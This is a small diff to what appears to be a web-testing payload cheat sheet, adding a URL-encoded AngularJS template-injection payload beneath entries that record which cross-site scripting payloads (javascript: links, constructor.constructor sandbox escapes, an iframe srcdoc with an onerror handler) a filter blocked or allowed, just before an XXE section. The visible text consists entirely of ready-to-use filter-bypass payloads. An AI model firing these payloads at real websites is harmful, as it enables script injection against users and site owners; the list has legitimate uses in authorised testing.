@@ -277,6 +277,10 @@ BLOCKED: "><a href=javascript:alert(1)>accept</a>
 
 ALLOWED: xyz"/ng-click="constructor.constructor('alert(1)')()
  Payload:  <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>  
+Payload: %7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
+
+
+
 
 -------------------------------------------------------------------------------------------
                                     XXE
